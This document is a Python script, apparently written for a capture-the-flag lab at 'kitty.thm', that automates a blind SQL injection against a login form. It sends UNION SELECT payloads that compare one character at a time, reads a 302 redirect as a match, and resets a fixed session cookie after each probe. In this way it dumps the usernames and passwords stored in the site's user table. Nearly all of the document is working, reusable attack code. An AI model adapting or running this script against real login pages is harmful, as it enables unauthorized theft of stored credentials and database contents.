#!/usr/bin/env python3
# dump_siteusers_fixed.py
# Dump username and password columns from mywebsite.siteusers using blind LEFT(...) = CONCAT(prefix, CHAR(ord)) probes.
# This avoids LIKE wildcard issues (%, _) by using equality on LEFT(...).
#
# Assumptions:
#  - POST /index.php with crafted username causes 302 on match, 200 otherwise.
#  - After each probe we call GET /logout.php and re-insert fixed PHPSESSID.
#  - Sleep between requests is 0.3s.

import requests
import time
import sys
from urllib.parse import urljoin
from requests.exceptions import RequestException

# ============== CONFIG ==============
TARGET_URL = "http://kitty.thm/index.php"    # POST endpoint (full URL)
COOKIE_VALUE = "t4ic0s1fnma6j8pjobipfbucgf"  # fixed PHPSESSID
DATABASE_NAME = "mywebsite"
TABLE_NAME = "siteusers"
COLUMNS = ["username", "password"]           # columns to dump in order
PASSWORD_FIELD = "aaa"                       # value to send in form password field
LOGOUT_PATH = "/logout.php"
SLEEP_BETWEEN = 0.3                          # seconds between requests (as requested)
MAX_VALUE_LEN = 256                          # safety cap for a field length
MAX_ROWS = 1000                              # safety cap on number of rows to try
ALLOW_REDIRECTS_FOR_LOGOUT = True
CHECK_LOCATION_FOR_WELCOME = False           # set True to require 'welcome.php' in Location header as well
# ======================================

HEADERS = {
    "User-Agent": "Mozilla/5.0 (blind-dump-script-fixed)",
    "Content-Type": "application/x-www-form-urlencoded",
}

# Character code range to try (printable ASCII by default).
CHAR_ORD_RANGE = list(range(32, 127))  # change to range(0,256) if you need full byte extraction

# NOTE: template now uses LEFT(..., n) = CONCAT(prefix, CHAR(ord))
# We compute n as len(prefix) + 1 inside SQL via CHAR_LENGTH(CONCAT(...)) or explicitly
# But simpler: LEFT(col, {next_len}) = CONCAT('{prefix}', CHAR({ord}))
# where next_len = length(prefix) + 1
USERNAME_TEMPLATE = (
    "a' UNION SELECT 1,2,3,4 WHERE "
    "BINARY LEFT((SELECT {col} FROM `{db}`.`{table}` LIMIT {idx},1), {next_len}) = CONCAT('{prefix}', CHAR({ord}));-- -"
)

session = requests.Session()
session.headers.update(HEADERS)
session.cookies.set("PHPSESSID", COOKIE_VALUE)

def get_logout_url(target, logout_path):
    return urljoin(target, logout_path)

LOGOUT_URL = get_logout_url(TARGET_URL, LOGOUT_PATH)

def reset_session_cookie():
    # Re-inject fixed PHPSESSID after logout to preserve "same session" for next probe.
    session.cookies.set("PHPSESSID", COOKIE_VALUE)

def send_probe(db, table, col, row_index, prefix, ord_code):
    """
    Send probe to ask whether LEFT(column, len(prefix)+1) == CONCAT(prefix, CHAR(ord_code))
    Returns True if response indicates match (302), False otherwise.
    Always attempts logout GET afterwards and re-injects PHPSESSID (best-effort).
    """
    # escape single quotes in prefix for SQL literal
    prefix_escaped = prefix.replace("'", "''")
    next_len = len(prefix) + 1
    payload_username = USERNAME_TEMPLATE.format(
        col=col,
        db=db,
        table=table,
        idx=row_index,
        next_len=next_len,
        prefix=prefix_escaped,
        ord=ord_code
    )
    data = {
        "username": payload_username,
        "password": PASSWORD_FIELD
    }
    tries = 3
    for attempt in range(tries):
        try:
            resp = session.post(TARGET_URL, data=data, allow_redirects=False, timeout=12)
            is_match = (resp.status_code == 302)
            if CHECK_LOCATION_FOR_WELCOME:
                is_match = is_match and ('welcome.php' in resp.headers.get('Location',''))
            # attempt logout (best-effort)
            try:
                session.get(LOGOUT_URL, allow_redirects=ALLOW_REDIRECTS_FOR_LOGOUT, timeout=8)
            except RequestException as e:
                print(f"[!] Logout GET failed (ignored): {e}", file=sys.stderr)
            # reinstate fixed cookie
            reset_session_cookie()
            return is_match
        except RequestException as e:
            print(f"[!] Network error on attempt {attempt+1}: {e}", file=sys.stderr)
            time.sleep(1)
    raise RuntimeError("Network failure: all retries failed")

def enumerate_value(db, table, col, row_index):
    """
    Enumerate a single value (column col at LIMIT row_index,1).
    Returns the string value, or None if no row exists at that index.
    """
    value = ""
    for pos in range(1, MAX_VALUE_LEN + 1):
        found = False
        for ord_code in CHAR_ORD_RANGE:
            try:
                if send_probe(db, table, col, row_index, value, ord_code):
                    value += chr(ord_code)
                    # printable representation for debugging
                    disp = repr(chr(ord_code))[1:-1]
                    print(f"[+] row {row_index} {col} char #{pos}: ord={ord_code} -> '{disp}'  -> so far: {value!r}")
                    found = True
                    time.sleep(SLEEP_BETWEEN)
                    break
                else:
                    time.sleep(SLEEP_BETWEEN)
            except RuntimeError:
                print("[!] Network problems, aborting enumeration.", file=sys.stderr)
                return None
        if not found:
            if pos == 1:
                # no first character -> likely no row at this index
                return None
            # end of string
            break
    return value

def enumerate_table_rows(db, table, columns):
    results = []
    print(f"[*] Starting dump of {db}.{table} for columns: {columns}")
    for row_idx in range(0, MAX_ROWS):
        row = {}
        any_exists = False
        print(f"[*] Enumerating row index {row_idx} ...")
        for col in columns:
            val = enumerate_value(db, table, col, row_idx)
            if val is None:
                if col == columns[0]:
                    any_exists = False
                    break
                else:
                    row[col] = ""
            else:
                any_exists = True
                row[col] = val
        if not any_exists:
            print(f"[*] No more rows at index {row_idx}. Stopping.")
            break
        print(f"[+] Row {row_idx}: " + " | ".join(f"{k}={v!r}" for k,v in row.items()))
        results.append(row)
    print("[*] Dump finished. Rows found:", len(results))
    return results

if __name__ == "__main__":
    try:
        rows = enumerate_table_rows(DATABASE_NAME, TABLE_NAME, COLUMNS)
        print("\n=== Final dump ===")
        for i, r in enumerate(rows):
            print(f"[{i}] " + " | ".join(f"{col}: {r.get(col,'')}" for col in COLUMNS))
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user", file=sys.stderr)
        sys.exit(1)
